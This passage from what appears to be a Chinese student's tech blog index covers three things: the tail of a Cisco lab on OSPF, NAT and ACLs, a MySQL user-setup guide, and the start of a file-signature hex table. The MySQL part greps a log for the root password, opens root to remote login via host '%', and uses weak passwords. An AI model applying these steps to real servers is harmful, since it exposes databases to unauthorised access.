0.0.0.0 192.168.4.101</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">end</span></span><br><span class="line"><span class="meta prompt_">Router#</span></span><br></pre></td></tr></table></figure><p>MS1:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int loopback0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip add 2.2.2.2 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">ip routing</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">router ospf 2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">router-id 2.2.2.2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 2.2.2.0 0.0.0.255 area 2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 10.1.2.0 0.0.0.255 area 2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 10.1.1.0 0.0.0.255 area 2</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 5.5.5.0 0.0.0.255 area 0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">log-adjacency-changes</span> </span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">ip route 0.0.0.0 0.0.0.0 10.1.2.101</span></span><br></pre></td></tr></table></figure><p>MS2:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Switch#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">int loopback0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">ip add 4.4.4.4 255.255.255.0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash">no shut</span></span><br><span class="line"><span class="meta prompt_">Switch(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">ip routing</span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash">router ospf 4</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">router-id 4.4.4.4</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 4.4.4.0 0.0.0.255 area 4</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 172.16.1.0 0.0.0.255 area 4</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 5.5.5.0 0.0.0.255 area 0</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 172.16.4.0 0.0.0.255 area 4</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">network 172.16.5.0 0.0.0.255 area 4</span></span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash">log-adjacency-changes</span> </span><br><span class="line"><span class="meta prompt_">Switch(config-router)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Switch(config)#</span><span class="language-bash"></span></span><br><span class="line"><span class="language-bash">Switch(config)<span class="comment">#ip route 0.0.0.0 0.0.0.0 172.16.1.101 //缺省路由</span></span></span><br></pre></td></tr></table></figure><p>连通效果图：<br><img src="https://user-images.githubusercontent.com/57565901/121059622-40eaa800-c7f4-11eb-8a56-9187653606e0.png" alt="image"></p><h2 id="0x04-至此所有设备均可以完成通讯-剩下的就是NAT协议和ACL策略组的布置了"><a href="#0x04-至此所有设备均可以完成通讯-剩下的就是NAT协议和ACL策略组的布置了" class="headerlink" title="0x04:至此所有设备均可以完成通讯,剩下的就是NAT协议和ACL策略组的布置了"></a>0x04:至此所有设备均可以完成通讯,剩下的就是NAT协议和ACL策略组的布置了</h2><p>  标准IP访问控制列表，一个标准IP访问控制列表匹配IP协议包钟的源地址或源地址中的一部分，<br>可对匹配的协议包采取拒绝或允许两个操作。编号范围是从1~99.</p><p>  扩展IP访问控制列表，扩展IP访问控制列表比标准IP访问控制列表具有更多的匹配项，<br>包括协议类型、源地址、目的地址、源端口、目的端口、建立连接的和IP优先级等。<br>编号范围是从100~199</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这里我们再看看该实验的要求：</span><br><span class="line">  （5）在学院核心路由器上配置合适的NAT，使得宿舍楼1和宿舍楼2所属子网范围能访问外网，而教学楼1和教学楼2所属子网范围不能访问外网。</span><br><span class="line">  （6）在学院核心路由器上设置标准ACL或扩展ACL，允许教学楼的用户只可以访问数据中心服务器的WWW服务和FTP服务。</span><br><span class="line">允许宿舍楼的用户可以访问外网的资源，也能访问教学楼的资源，其余的都不可以访问。</span><br></pre></td></tr></table></figure><blockquote><p>这里WWW服务即TCP协议端口默认为80，FTP文件传输协议默认端口为21。</p></blockquote><p>因为要使<code>宿舍楼1</code>和<code>宿舍楼2</code>能访问外网，而<code>教学楼1</code>和<code>教学楼2</code>不能访问外网，<br>所以我们只需要对教学楼所属网段设置对应的动态NAT即可</p><blockquote><p>此处注意nat相关的标准访问控制列表acl只能是路由器接口in方向</p></blockquote><p>我们创建一个动态NAT的地址池为：202.121.241.9~202.121.241.100 (子网掩码&#x2F;24)<br>对于核心路由器Router 1:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Router&gt;</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Router#</span><span class="language-bash">conf t</span></span><br><span class="line">Enter configuration commands, one per line.  End with CNTL/Z.</span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">access-list 10 permit 172.16.0.0 0.0.255.255</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">access-list 10 deny any</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">int fa1/0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">ip access-group 10 <span class="keyword">in</span></span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line">//创建一个地址池,地址池命名为nat-pool_1 </span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">ip nat pool nat-pool_1 202.121.241.9 202.121.241.100 netmask 255.255.255.0</span></span><br><span class="line">//设置地址池nat-pool_1到inside方向，附加访问控制列表10</span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">ip nat inside <span class="built_in">source</span> list 10 pool nat-pool_1</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">int fa1/0</span></span><br><span class="line">//设置接口fa1/0为NAT内接口</span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">ip nat inside</span></span><br><span class="line">//设置接口s0/3/0为NAT外接口</span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">int s0/3/0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">ip nat outside</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br></pre></td></tr></table></figure><p>测试刚刚配置的动态NAT，让宿舍楼1和宿舍楼2的PC与外网设备通信,通过以下指令查看动态路由结果:<br>这里可以发现第一列inside global 中出现了我们建好的地址池中的IP</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Router#</span><span class="language-bash">sh ip nat translations</span> </span><br><span class="line">Pro  Inside global     Inside local       Outside local      Outside global</span><br><span class="line">icmp 202.121.241.10:1  172.16.5.22:1      219.220.240.101:1  219.220.240.101:1</span><br><span class="line">icmp 202.121.241.9:2   172.16.4.22:2      219.220.240.101:2  219.220.240.101:2</span><br></pre></td></tr></table></figure><p>这里我们完成了宿舍楼通过NAT访问外网,下面设置的ACL将令教学楼1和教学楼2不能访问外网。<br>对于核心路由器Router 1:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Router#</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Router#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">access-list 102 permit ip 172.16.0.0 0.0.255.255 any</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">access-list 102 deny ip 192.168.0.0 0.0.255.255 any</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">access-list 102 permit ip any any</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">int s0/3/0</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">ip access-group 102 out</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span></span><br></pre></td></tr></table></figure><p>下面设置只能访问数据中心的80和21端口。<br>对于核心路由器Router 1:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">Router#</span><span class="language-bash">en</span></span><br><span class="line"><span class="meta prompt_">Router#</span><span class="language-bash">conf t</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">access-list 101 permit tcp any 10.1.0.0 0.0.255.255 eq 80</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">access-list 101 permit tcp any 10.1.0.0 0.0.255.255 eq 21</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">access-list 101 deny ip any any</span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span><span class="language-bash">int fa1/1</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash">ip access-group 101 out</span></span><br><span class="line"><span class="meta prompt_">Router(config-if)#</span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line"><span class="meta prompt_">Router(config)#</span></span><br></pre></td></tr></table></figure><!-- wp:paragraph --><p>个人疏忽，其实还有教学楼与宿舍楼不能互通，并且宿舍楼不能访问数据中心，只需要在101策略组最后一条前加上一条：</p><!-- /wp:paragraph --><!-- wp:code --><pre class="wp-block-code"><code>access-list 101 deny ip 172.16.0.0 0.0.255.255 any</code></pre><!-- /wp:code --><!-- wp:paragraph --><p>在Router1的f0/0接口上加上一个103策略组：</p><!-- /wp:paragraph --><!-- wp:code --><pre class="wp-block-code"><code>Router#conf tRouter(config)#access-list 103 deny ip 192.168.0.0 0.0.255.255 172.16.0.0 0.0.255.255Router(config)#access-list 103 permit ip any anyRouter(config)#int fa0/0Router(config-if)#ip access-group 103 inRouter(config-if)#exit</code></pre><!-- /wp:code --><h3 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果:"></a>最终效果:</h3><blockquote><p>PC0:外网设备<br>PC1:教学楼1设备<br>PC2:教学楼2设备<br>PC3:宿舍楼1设备<br>PC4:宿舍楼2设备  </p></blockquote><p><img src="https://user-images.githubusercontent.com/57565901/121219035-e023a400-c8b5-11eb-924a-08596d229a44.png" alt="image"></p><p>使用浏览器访问数据中心datacenter的80端口：</p><blockquote><p>PC1:教学楼1设备<br>PC2:教学楼2设备<br>在上图中PC1和PC2不能直接通过ICMP(ping命令)访问datacenter，保证数据中心安全。  </p></blockquote><p><img src="https://user-images.githubusercontent.com/57565901/121219349-2f69d480-c8b6-11eb-80b9-3a400441ff94.png" alt="image"><br><img src="https://user-images.githubusercontent.com/57565901/121219393-3a246980-c8b6-11eb-9c6a-9ea46f1061cb.png" alt="image"></p><h2 id="0x05-至此我们完成了实验六所有的实验要求"><a href="#0x05-至此我们完成了实验六所有的实验要求" class="headerlink" title="0x05:至此我们完成了实验六所有的实验要求"></a>0x05:至此我们完成了实验六所有的实验要求</h2><p>所有命令、截图都为本人完成，仅供参考，拒绝转载。   </p><p>By Auspic1ous 大二菜鸡  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Web </tag>
            
            <tag> Cisco模拟器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Mysql新建用户及数据库随笔</title>
      <link href="/2021/02/18/a38d80c5dd3f-q1jun/"/>
      <url>/2021/02/18/a38d80c5dd3f-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="Mysql-新建用户以及数据库随笔"><a href="#Mysql-新建用户以及数据库随笔" class="headerlink" title="Mysql 新建用户以及数据库随笔"></a>Mysql 新建用户以及数据库随笔</h1><h2 id="1-安装好MySQL之后"><a href="#1-安装好MySQL之后" class="headerlink" title="1. 安装好MySQL之后"></a>1. 安装好MySQL之后</h2><p>假如是通过yum等包控制器安装等mysql，我们没有设置root的初始密码，我们需要通过查找配置文件来得到root用户的默认密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /var/log/mysqld.log |grep password</span><br></pre></td></tr></table></figure><p>得到密码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2021-11-16T09:50:21.808068Z 6 [Note] [MY-010454] [Server] A temporary password is generated <span class="keyword">for</span> root@localhost: PcWkrqq,/1r+</span><br></pre></td></tr></table></figure><h2 id="2-修改默认密码"><a href="#2-修改默认密码" class="headerlink" title="2.修改默认密码"></a>2.修改默认密码</h2><p>通过所得默认密码进入root用户mysql：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p </span><br></pre></td></tr></table></figure><p>然后通过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET PASSWORD = PASSWORD(<span class="string">&quot;password&quot;</span>);</span><br></pre></td></tr></table></figure><p>修改默认密码为 <code>password</code> 。</p><blockquote><p>但是有时候这里报错：<br>ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘PASSWORD(“password”)’ at line 1</p></blockquote><p>或者通过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; Alter user <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="string">&#x27;password&#x27;</span>;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br></pre></td></tr></table></figure><p>提示Query OK说明修改密码成功！</p><h2 id="3-开启用户远程访问"><a href="#3-开启用户远程访问" class="headerlink" title="3.开启用户远程访问"></a>3.开启用户远程访问</h2><p>选择数据库‘mysql’：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br></pre></td></tr></table></figure><p>查看user表，用<code>\G</code>可以格式化输出：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from user \G;</span><br><span class="line">select host,user from user \G;</span><br></pre></td></tr></table></figure><p>修改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update user <span class="built_in">set</span> host=<span class="string">&quot;%&quot;</span> <span class="built_in">where</span> Host=<span class="string">&#x27;localhost&#x27;</span> and user=<span class="string">&quot;root&quot;</span>;</span><br></pre></td></tr></table></figure><p>更新权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flush privileges;</span><br></pre></td></tr></table></figure><h2 id="4-创建数据库和用户"><a href="#4-创建数据库和用户" class="headerlink" title="4.创建数据库和用户"></a>4.创建数据库和用户</h2><p>创建数据库：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create DATABASE wp_data Default character <span class="built_in">set</span> utf8 collate utf8_unicode_ci;</span><br></pre></td></tr></table></figure><p>创建用户并设置密码，赋予权限：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grant all on wp_data.* to <span class="string">&#x27;wp_user&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="string">&quot;password&quot;</span>;</span><br></pre></td></tr></table></figure><p><strong>第二种方法：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CREATE ROLE <span class="string">&#x27;wp_user&#x27;</span>;</span><br><span class="line">GRANT ALL ON wp_data.* to <span class="string">&#x27;wp_user&#x27;</span>;</span><br><span class="line">Alter user <span class="string">&#x27;wp_user&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified by <span class="string">&#x27;Qwe111..&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><p>由于前面我们开启了远程访问，此处’localhost’需要改为’%’，否则会报错！<br>可以通过 <code>select user,host from user;</code>查看。</p></blockquote><p>当我们输入进入’wp_user’用户界面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql -u wp_user -p</span><br><span class="line">Enter password: </span><br><span class="line">ERROR 3118 (HY000): Access denied <span class="keyword">for</span> user <span class="string">&#x27;wp_user&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>. Account is locked.</span><br></pre></td></tr></table></figure><p>报错，用户被锁定。<br>我们再进入root用户：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select user,host,account_locked From mysql.user <span class="built_in">where</span> user=<span class="string">&#x27;wp_user&#x27;</span>;</span><br><span class="line">+---------+------+----------------+</span><br><span class="line">| user    | host | account_locked |</span><br><span class="line">+---------+------+----------------+</span><br><span class="line">| wp_user | %    | Y              |</span><br><span class="line">+---------+------+----------------+</span><br><span class="line">1 row <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure><p>然后修改：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Alter user <span class="string">&#x27;wp_user&#x27;</span>@<span class="string">&#x27;%&#x27;</span> account unlock;</span><br></pre></td></tr></table></figure><p>然后就可以成功进入新用户了。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">[root@TSRAL6PZHRZ2 tmp]<span class="comment"># mysql -u wp_user -p</span></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection <span class="built_in">id</span> is 12</span><br><span class="line">Server version: 8.0.27 MySQL Community Server - GPL</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2021, Oracle and/or its affiliates.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| wp_data            |</span><br><span class="line">+--------------------+</span><br><span class="line">2 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 后端学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> Linux </tag>
            
            <tag> MySql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的文件头十六进制格式</title>
      <link href="/2021/02/12/d877fb6462e1-q1jun/"/>
      <url>/2021/02/12/d877fb6462e1-q1jun/</url>
      
        <content type="html"><![CDATA[<h1 id="常见文件头格式："><a href="#常见文件头格式：" class="headerlink" title="常见文件头格式："></a>常见文件头格式：</h1><p>[<br>    {“扩展名”:123,”文件头标识（HEX）”:”00001A00051004”,”文件描述”:”Lotus1-2-3spreadsheet(v9)file”},<br>    {“扩展名”:”3gg;3gp;3g2”,”文件头标识（HEX）”:”000000nn66747970336770”,”文件描述”:”3rdGenerationPartnershipProject3GPP(nn&#x3D;0x14)and3GPP2(nn&#x3D;0x20)multimediafiles”},<br>    {“扩展名”:”7z”,”文件头标识（HEX）”:”377ABCAF271C”,”文件描述”:”7-ZIPcompressedfile”},<br>    {“扩展名”:”aba”,”文件头标识（HEX）”:”00014241”,”文件描述”:”PalmAddressBookArchivefile”},<br>    {“扩展名”:”abi”,”文件头标识（HEX）”:”414F4C494E444558”,”文件描述”:”AOLaddressbookindexfile”},<br>    {“扩展名”:”aby;idx”,”文件头标识（HEX）”:”414F4C4442”,”文件描述”:”AOLdatabasefiles:addressbook(ABY)anduserconfigurationdata(MAIN.IDX)”},<br>    {“扩展名”:”accdb”,”文件头标识（HEX）”:”000100005374616E6461726420414345204442”,”文件描述”:”MicrosoftAccess2007file”},<br>    {“扩展名”:”ACM”,”文件头标识（HEX）”:”4D5A”,”文件描述”:”MSaudiocompressionmanagerdriver”},<br>    {“扩展名”:”ADF”,”文件头标识（HEX）”:”444F53”,”文件描述”:”Amigadiskfile”},<br>    {“扩展名”:”adx”,”文件头标识（HEX）”:”0300000041505052”,”文件描述”:”LotusApproachADXfile”},<br>    {“扩展名”:”AIFF”,”文件头标识（HEX）”:”464F524D00”,”文件描述”:”AudioInterchangeFile”},<br>    {“扩展名”:”ain”,”文件头标识（HEX）”:”2112”,”文件描述”:”AINCompressedArchiveFile”},<br>    {“扩展名”:”ami”,”文件头标识（HEX）”:”5B7665725D”,”文件描述”:”LotusAmiPro”},<br>    {“扩展名”:”amr”,”文件头标识（HEX）”:”2321414D52”,”文件描述”:”AdaptiveMulti-RateACELP(AlgebraicCodeExcitedLinearPrediction)Codec,commonlyaudioformatwithGSMcellphones”},<br>    {“扩展名”:”ANI”,”文件头标识（HEX）”:”52494646”,”文件描述”:””},<br>    {“扩展名”:”API”,”文件头标识（HEX）”:”4D5A900003000000”,”文件描述”:”Acrobatplug-in”},<br>    {“扩展名”:”arc”,”文件头标识（HEX）”:”1A0x”,”文件描述”:”LHarchivefile,oldversion(wherex&#x3D;0x2,0x3,0x4,0x8or0x9fortypes1-5,respectively)”},<br>    {“扩展名”:”arc”,”文件头标识（HEX）”:”41724301”,”文件描述”:”FreeArccompressedfile”},<br>    {“扩展名”:”arj”,”文件头标识（HEX）”:”60EA”,”文件描述”:”ARJCompressedArchive”},<br>    {“扩展名”:”ARJ”,”文件头标识（HEX）”:”60EA27”,”文件描述”:””},<br>    {“扩展名”:”ART”,”文件头标识（HEX）”:”4A47030E000000”,”文件描述”:”AOLARTfile”},<br>    {“扩展名”:”ART”,”文件头标识（HEX）”:”4A47040E000000”,”文件描述”:”AOLARTfile”},<br>    {“扩展名”:”asf”,”文件头标识（HEX）”:”3026B2758E66CF11”,”文件描述”:”WindowsMedia”},<br>    {“扩展名”:”asf;wma;wmv”,”文件头标识（HEX）”:”3026B2758E66CF11A6D900AA0062CE6C”,”文件描述”:”MicrosoftWindowsMediaAudio&#x2F;VideoFile(AdvancedStreamingFormat)”},<br>    {“扩展名”:”asx”,”文件头标识（HEX）”:”3C”,”文件描述”:”AdvancedStreamredirectorfile”},<br>    {“扩展名”:”au”,”文件头标识（HEX）”:”2E736E64”,”文件描述”:”SoundMachineAudioFile”},<br>    {“扩展名”:””,”文件头标识（HEX）”:””,”文件描述”:”NeXT&#x2F;SunMicrosystemsμ-Lawaudiofile”},<br>    {“扩展名”:”avi”,”文件头标识（HEX）”:”41564920”,”文件描述”:”AudioVideoInterleave(AVI)”},<br>    {“扩展名”:”AX”,”文件头标识（HEX）”:”4D5A”,”文件描述”:”Librarycachefile”},<br>    {“扩展名”:”AX”,”文件头标识（HEX）”:”4D5A900003000000”,”文件描述”:”DirectShowfilter”},<br>    {“扩展名”:”bag”,”文件头标识（HEX）”:”414F4C2046656564626167”,”文件描述”:”AOLandAIMbuddylistfile”},<br>    {“扩展名”:”BAS”,”文件头标识（HEX）”:”202020”,”文件描述”:””},<br>    {“扩展名”:”bin”,”文件头标识（HEX）”:”424C4932323351”,”文件描述”:”ThomsonSpeedtouchseriesWLANrouterfirmware”},<br>    {“扩展名”:”bmp”,”文件头标识（HEX）”:”424D”,”文件描述”:”WindowsBitmap”},<br>    {“扩展名”:”BMP”,”文件头标识（HEX）”:”424D3E”,”文件描述”:””},<br>    {“扩展名”:”bz;bz2”,”文件头标识（HEX）”:”425A68”,”文件描述”:”BZIPArchive”},<br>    {“扩展名”:”BZ2;TAR.BZ2;TBZ2;TB2”,”文件头标识（HEX）”:”425A68”,”文件描述”:”bzip2compressedarchive”},<br>    {“扩展名”:”CAB”,”文件头标识（HEX）”:”495363”,”文件描述”:””},<br>    {“扩展名”:”CAB;HDR”,”文件头标识（HEX）”:”49536328”,”文件描述”:”InstallShieldv5.xor6.xcompressedfile”},<br>    {“扩展名”:”CAB”,”文件头标识（HEX）”:”4D534346”,”文件描述”:”MicrosoftCABFileFormat”},<br>    {“扩展名”:”cat”,”文件头标识（HEX）”:30,”文件描述”:”Microsoftsecuritycatalogfile”},<br>    {“扩展名”:”CBD”,”文件头标识（HEX）”:”434246494C45”,”文件描述”:”WordPerfectdictionaryfile(unconfirmed)”},<br>    {“扩展名”:”CCD”,”文件头标识（HEX）”:”5B436C”,”文件描述”:””},<br>    {“扩展名”:”cdr”,”文件头标识（HEX）”:”CDR”,”文件描述”:”CorelDraw”},<br>    {“扩展名”:”CDR”,”文件头标识（HEX）”:”454C49544520436F6D6D616E64657220”,”文件描述”:”ElitePlusCommandersavedgamefile”},<br>    {“扩展名”:”CDR,DVF”,”文件头标识（HEX）”:”4D535F564F494345”,”文件描述”:”SonyCompressedVoiceFile”},<br>    {“扩展名”:”CHI;CHM”,”文件头标识（HEX）”:”49545346”,”文件描述”:”MicrosoftCompiledHTMLHelpFile”},<br>    